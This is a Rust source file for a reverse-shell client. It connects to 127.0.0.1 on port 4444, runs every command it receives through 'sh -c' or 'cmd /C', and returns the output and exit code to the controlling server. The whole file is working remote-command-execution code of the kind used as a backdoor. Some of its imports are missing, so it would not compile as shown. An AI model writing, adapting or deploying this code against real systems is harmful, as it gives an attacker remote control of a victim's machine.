use std::sync::{Arc, Mutex};
use std::thread;

fn main() -> std::io::Result<()> {
    println!("Connecting to server at 127.0.0.1:4444...");

    // Connect to the server
    let stream = match TcpStream::connect("127.0.0.1:4444") {
        Ok(stream) => {
            println!("Connected to server!");
            stream
        }
        Err(e) => {
            eprintln!("Failed to connect to server: {}", e);
            return Err(e);
        }
    };

    // Wrap stream in Arc<Mutex<>> for shared ownership between threads
    let shared_stream = Arc::new(Mutex::new(stream));

    // Clone for reader thread
    let reader_stream = shared_stream.clone();

    // Spawn a thread to handle incoming commands
    let reader_thread = thread::spawn(move || {
        // Create a clone of the stream for reading
        let read_stream = match reader_stream.lock() {
            Ok(guard) => match guard.try_clone() {
                Ok(clone) => clone,
                Err(e) => {
                    eprintln!("Failed to clone read stream: {}", e);
                    return;
                }
            },
            Err(e) => {
                eprintln!("Failed to acquire lock on reader stream: {}", e);
                return;
            }
        };

        let reader = BufReader::new(read_stream);
        for line in reader.lines() {
            match line {
                Ok(command) => {
                    println!("Received command: {}", command);
                    // Clone the stream handler for sending response
                    let response_stream = reader_stream.clone();
                    execute_command(&command, response_stream);
                }
                Err(e) => {
                    eprintln!("Error reading from server: {}", e);
                    break;
                }
            }
        }
    });

    // Wait for the reader thread to complete
    reader_thread.join().unwrap();

    Ok(())
}

fn execute_command(command: &str, stream: Arc<Mutex<TcpStream>>) {
    println!("Executing command: {}", command);

    if command.trim().is_empty() {
        send_response("Empty command received", stream);
        return;
    }

    // Execute the command
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", command])
            .output()
    } else {
        Command::new("sh")
            .args(&["-c", command])
            .output()
    };

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let status = output.status;

            let response = format!(
                "Command: {}\nExit Code: {}\nStdout:\n{}\nStderr:\n{}",
                command, status, stdout, stderr
            );

            send_response(&response, stream);
        }
        Err(e) => {
            let error_msg = format!("Failed to execute command '{}': {}", command, e);
            send_response(&error_msg, stream);
        }
    }
}

fn send_response(response: &str, stream: Arc<Mutex<TcpStream>>) {
    println!("Sending response:\n{}", response);

    // Send the response back to the server
    match stream.lock() {
        Ok(mut stream_guard) => {
            if let Err(e) = stream_guard.write_all(response.as_bytes()) {
                eprintln!("Failed to send response: {}", e);
                return;
            }
            if let Err(e) = stream_guard.write_all(b"\n") {
                eprintln!("Failed to send newline: {}", e);
                return;
            }
            if let Err(e) = stream_guard.flush() {
                eprintln!("Failed to flush stream: {}", e);
                return;
            }
        }
        Err(e) => {
            eprintln!("Failed to acquire lock on stream for sending response: {}", e);
        }
    }
}

